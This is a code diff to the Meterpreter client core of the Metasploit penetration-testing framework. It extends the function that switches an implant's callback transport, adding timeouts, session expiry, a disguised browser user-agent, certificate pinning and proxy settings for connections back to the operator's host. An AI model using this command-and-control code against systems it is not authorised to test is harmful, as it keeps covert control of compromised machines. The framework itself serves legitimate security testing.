@@ -17,6 +17,9 @@ require 'rex/payloads/meterpreter/uri_checksum'
 # URI checksumming stuff
 require 'msf/core/handler/reverse_https'
 
+# certificate hash checking
+require 'rex/parser/x509_certificate'
+
 module Rex
 module Post
 module Meterpreter
@@ -37,6 +40,9 @@ class ClientCore < Extension
   METERPRETER_TRANSPORT_SSL   = 0
   METERPRETER_TRANSPORT_HTTP  = 1
   METERPRETER_TRANSPORT_HTTPS = 2
+
+  DEFAULT_SESSION_EXPIRATION = 24*3600*7
+  DEFAULT_COMMS_TIMEOUT = 300
 
   VALID_TRANSPORTS = {
     'reverse_tcp'   => METERPRETER_TRANSPORT_SSL,
@@ -253,25 +259,64 @@ class ClientCore < Extension
   end
 
   def change_transport(opts={})
-    transport = opts[:type].downcase
 
-    unless valid_transport?(transport)
-      raise ArgumentError, "#{transport} is not a valid transport"
+    unless valid_transport?(opts[:transport]) && opts[:lport]
+      return false
     end
+
+    if opts[:transport].starts_with?('reverse')
+      return false unless opts[:lhost]
+    else
+      # Bind shouldn't have lhost set
+      opts[:lhost] = nil
+    end
+
+    transport = VALID_TRANSPORTS[opts[:transport]]
 
     request = Packet.create_request('core_change_transport')
 
-    scheme = transport.split('_')[1]
+    scheme = opts[:transport].split('_')[1]
     url = "#{scheme}://#{opts[:lhost]}:#{opts[:lport]}"
 
-    unless transport.ends_with?('tcp')
+    # do more magic work for http(s) payloads
+    unless opts[:transport].ends_with?('tcp')
       checksum = generate_uri_checksum(URI_CHECKSUM_CONN)
       rand = Rex::Text.rand_text_alphanumeric(16)
       url <<  "/#{checksum}_#{rand}/"
+
+      opts[:comms_timeout] ||= DEFAULT_COMMS_TIMEOUT
+      request.add_tlv(TLV_TYPE_TRANS_COMMS_TIMEOUT, opts[:comms_timeout])
+
+      opts[:session_exp] ||= DEFAULT_SESSION_EXPIRATION
+      request.add_tlv(TLV_TYPE_TRANS_SESSION_EXP, opts[:session_exp])
+
+      # TODO: randomise if not specified?
+      opts[:ua] ||= 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'
+      request.add_tlv(TLV_TYPE_TRANS_UA, opts[:ua])
+
+      if transport == METERPRETER_TRANSPORT_HTTPS && opts[:cert]
+        hash = Rex::Parser::X509Certificate.get_cert_file_hash(opts[:cert])
+        request.add_tlv(TLV_TYPE_TRANS_CERT_HASH, hash)
+      end
+
+      if opts[:proxy_host] && opts[:proxy_port]
+        prefix = 'http://'
+        prefix = 'socks=' if opts[:proxy_type] == 'socks'
+        proxy = "#{prefix}#{opts[:proxy_host]}:#{opts[:proxy_port]}"
+        request.add_tlv(TLV_TYPE_TRANS_PROXY_INFO, proxy)
+
+        if opts[:proxy_user]
+          request.add_tlv(TLV_TYPE_TRANS_PROXY_USER, opts[:proxy_user])
+        end
+        if opts[:proxy_pass]
+          request.add_tlv(TLV_TYPE_TRANS_PROXY_PASS, opts[:proxy_pass])
+        end
+      end
+
     end
 
-    request.add_tlv(TLV_TYPE_TRANSPORT_TYPE, VALID_TRANSPORTS[transport])
-    request.add_tlv(TLV_TYPE_TRANSPORT_URL, url)
+    request.add_tlv(TLV_TYPE_TRANS_TYPE, transport)
+    request.add_tlv(TLV_TYPE_TRANS_URL, url)
 
     client.send_request(request)
     return true
@@ -301,7 +346,7 @@ class ClientCore < Extension
     }
 
     # We cant migrate into a process that does not exist.
-    if process.nil?
+    unless process
       raise RuntimeError, "Cannot migrate into non existent process", caller
     end
 
